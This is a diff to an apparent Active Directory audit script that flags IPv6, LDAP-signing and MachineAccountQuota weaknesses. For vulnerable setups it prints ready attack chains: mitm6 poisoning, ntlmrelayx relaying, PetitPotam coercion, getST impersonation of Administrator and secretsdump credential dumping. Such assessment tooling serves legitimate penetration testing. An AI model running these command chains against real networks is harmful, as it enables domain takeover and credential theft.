@@ -560,9 +560,10 @@ fi
 IPV6_ENABLED=$(dig +short AAAA $DC_HOSTNAME 2>/dev/null)
 if [ -z "$IPV6_ENABLED" ]; then
   echo -e "${RED}[KO] No IPv6 DNS record for DC (DHCPv6 Poisoning)${NC}"
-  echo -e "${GREY}       └─ mitm6 -d $DOMAIN${NC}"
+  IPV6_VULN=1
 else
   echo -e "${GREEN}[OK] IPv6 DNS configured for DC (no DHCPv6 Poisoning)${NC}"
+  IPV6_VULN=0
 fi
 
 
@@ -740,6 +741,7 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
     fi
   done < "$OUTPUT_DIR/all_dcs.txt"
   if [ $VULN_COUNT -gt 0 ]; then
+    LDAP_SIGNING_VULN=1 
     if [ $VULN_COUNT -eq $DC_COUNT ]; then
       echo -e "${RED}[KO] All $DC_COUNT DCs: LDAP Signing + LDAPS Channel Binding NOT enforced → ldap_security_check.csv${NC}"
     else
@@ -756,6 +758,7 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
     fi
   else
     echo -e "${GREEN}[OK] LDAP Signing + LDAPS Channel Binding on all DCs enforced${NC}"
+    LDAP_SIGNING_VULN=0 
   fi
 else
   LDAP_CHECK=$(netexec ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
@@ -763,6 +766,7 @@ else
   LDAP_CB=$(echo "$LDAP_CHECK" | grep -oP 'channel binding:\K\S+')
   if [ "$LDAP_SIGNING" = "None" ] && [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
     echo -e "${RED}[KO] LDAP Signing + LDAPS Channel Binding NOT enforced${NC}"
+    LDAP_SIGNING_VULN=1
     if [ "$RELAY_COUNT" -gt 0 ]; then
       echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${DC_IP} --remove-mic --delegate-access${NC}"
       echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
@@ -773,11 +777,14 @@ else
   elif [ "$LDAP_SIGNING" = "None" ]; then
     echo -e "${RED}[KO] LDAP Signing NOT enforced${NC}"
     echo -e "${GREEN}       └─ Not Exploitable: LDAPS Channel Binding enabled${NC}"
+    LDAP_SIGNING_VULN=0 
   elif [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
     echo -e "${RED}[KO] LDAP Channel Binding NOT enforced${NC}"
     echo -e "${GREEN}       └─ Not Exploitable: LDAP Signing enabled${NC}"
+    LDAP_SIGNING_VULN=0 
   else
     echo -e "${GREEN}[OK] LDAP Signing + LDAPS Channel Binding enforced${NC}"
+    LDAP_SIGNING_VULN=0 
   fi
 fi
 
@@ -1073,6 +1080,16 @@ if [ ! -z "$MAQ" ]; then
   if [ "$MAQ" -gt 0 ]; then
     echo -e "${RED}[KO] MachineAccountQuota: $MAQ (Users can create computer objects)${NC}"
     echo -e "${GREY}       └─ addcomputer.py -computer-name 'AAAAAAA\$' -computer-pass 'Ilovefkad1337?' '$DOMAIN/$AD_USER:$PASSWORD' -dc-ip $DC_IP${NC}"
+    
+    # MITM6 + NTLM + MAQ Relay
+    if [ "$IPV6_VULN" = "1" ] && [ "$LDAP_SIGNING_VULN" = "1" ]; then
+      echo -e "${RED}       └─ MITM6 + NTLM Relay → DA Path possible${NC}"
+      echo -e "${GREY}          1) mitm6 -d $DOMAIN${NC}"
+      echo -e "${GREY}          2) ntlmrelayx.py -t ldaps://$DC_IP -wh fakewpad --add-computer --delegate-access${NC}"
+      echo -e "${GREY}          3) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+      echo -e "${GREY}          4) getST.py -spn cifs/$DC_FQDN '$DOMAIN/NEWCOMPUTER\$' -impersonate Administrator -dc-ip $DC_IP${NC}"
+      echo -e "${GREY}          5) secretsdump.py -k -no-pass '$DOMAIN/Administrator@$DC_FQDN'${NC}"
+    fi
   else
     echo -e "${GREEN}[OK] MachineAccountQuota: 0 (Computer creation restricted)${NC}"
   fi
